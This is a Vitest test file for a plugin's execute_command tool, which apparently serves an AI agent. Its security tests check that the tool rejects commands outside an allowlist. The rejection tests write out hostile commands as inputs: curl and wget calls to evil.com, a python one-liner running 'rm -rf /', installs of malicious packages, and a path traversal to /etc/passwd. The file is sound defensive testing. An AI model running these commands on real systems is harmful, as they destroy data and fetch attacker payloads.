/**
 * @file System Tools Tests
 * @layer core
 * Tests for src/core/tools/system.js
 * Focus: execute_command security (highest risk), structure validation
 */

import { describe, it, expect } from 'vitest';
import plugin from '../src/core/tools/system.js';

describe('system plugin — structure', () => {
  it('should export a plugin with name "system"', () => {
    expect(plugin.name).toBe('system');
    expect(Array.isArray(plugin.tools)).toBe(true);
  });

  it('should have 3 tools: process_new_raw, execute_command, extract_formulas', () => {
    expect(plugin.tools).toHaveLength(3);
    const names = plugin.tools.map(t => t.name);
    expect(names).toContain('process_new_raw');
    expect(names).toContain('execute_command');
    expect(names).toContain('extract_formulas');
  });
});

describe('execute_command — security (Phase 0 hardened)', () => {
  const tool = plugin.tools.find(t => t.name === 'execute_command')!;

  // ── REJECTION TESTS ──
  it('should reject empty command', () => {
    expect(tool.execute({ command: '' })).toHaveProperty('error');
  });

  it('should reject whitespace-only command', () => {
    expect(tool.execute({ command: '   ' })).toHaveProperty('error');
  });

  it('should reject non-whitelisted commands (e.g. powershell)', () => {
    expect(tool.execute({ command: 'powershell Get-Process' })).toHaveProperty('error');
  });

  it('should reject curl (removed from whitelist Phase 0)', () => {
    expect(tool.execute({ command: 'curl http://evil.com' })).toHaveProperty('error');
  });

  it('should reject python (removed from whitelist Phase 0)', () => {
    expect(tool.execute({ command: 'python -c "import os; os.system(\'rm -rf /\')"' })).toHaveProperty('error');
  });

  it('should reject npx (removed from whitelist Phase 0)', () => {
    expect(tool.execute({ command: 'npx malicious-package' })).toHaveProperty('error');
  });

  it('should reject npm (removed from whitelist Phase 0)', () => {
    expect(tool.execute({ command: 'npm install malicious' })).toHaveProperty('error');
  });

  it('should reject wget (removed from whitelist Phase 0)', () => {
    expect(tool.execute({ command: 'wget http://evil.com/payload' })).toHaveProperty('error');
  });

  it('should reject command with path traversal', () => {
    expect(tool.execute({ command: '../../etc/passwd' })).toHaveProperty('error');
  });

  it('should reject powershell (no shell: powershell.exe)', () => {
    expect(tool.execute({ command: 'powershell -c "Get-ChildItem"' })).toHaveProperty('error');
  });

  // ── ACCEPTANCE TESTS (whitelisted commands) ──
  it('should accept and run git --version', () => {
    const r = tool.execute({ command: 'git --version' });
    expect(r).not.toHaveProperty('error');
    if (typeof r === 'string') expect(r).toMatch(/git version/i);
  });

  it('should accept and run node -e', () => {
    const r = tool.execute({ command: 'node -e "console.log(42)"' });
    expect(r).not.toHaveProperty('error');
    if (typeof r === 'string') expect(r).toContain('42');
  });

  it('should accept dir command', () => {
    const r = tool.execute({ command: 'dir' });
    // dir might not exist on non-Windows, but should be whitelisted
    if ((r as any).error) {
      // Error should be about command not found, not whitelist rejection
      expect((r as any).error).not.toContain('whitelist');
    }
  });

  it('should accept echo command', () => {
    const r = tool.execute({ command: 'echo hello' });
    expect(r).not.toHaveProperty('error');
  });
});

describe('extract_formulas — structure validation', () => {
  const tool = plugin.tools.find(t => t.name === 'extract_formulas')!;

  it('should require mdPath parameter', () => {
    expect(tool.schema.required).toContain('mdPath');
  });

  it('should reject empty mdPath gracefully', () => {
    const r = tool.execute({ mdPath: '' });
    expect(r).toHaveProperty('error');
  });

  it('should reject non-existent file', () => {
    const r = tool.execute({ mdPath: '/nonexistent/file.md' });
    expect(r).toHaveProperty('error');
  });
});

describe('process_new_raw — structure validation', () => {
  const tool = plugin.tools.find(t => t.name === 'process_new_raw')!;

  it('should require input_dir parameter', () => {
    expect(tool.schema.required).toContain('input_dir');
  });
});
